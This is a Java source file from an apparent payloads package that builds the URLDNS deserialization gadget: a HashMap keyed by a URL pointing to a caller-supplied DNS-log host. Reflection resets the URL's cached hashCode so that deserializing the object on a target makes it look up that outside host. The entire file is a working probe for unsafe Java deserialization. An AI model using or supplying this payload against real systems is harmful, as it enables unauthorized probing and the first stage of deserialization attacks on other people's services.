package payloads;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;


public class Urldns {
    public static HashMap exec(String dnslog) throws Exception {
    	HashMap hashMap = new HashMap();
  		URL url = new URL("http://"+dnslog);
  		Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
  		f.setAccessible(true);
  		f.set(url, 0);
  		hashMap.put(url, "111");
  		f.set(url, -1);
    	return hashMap;
}
}
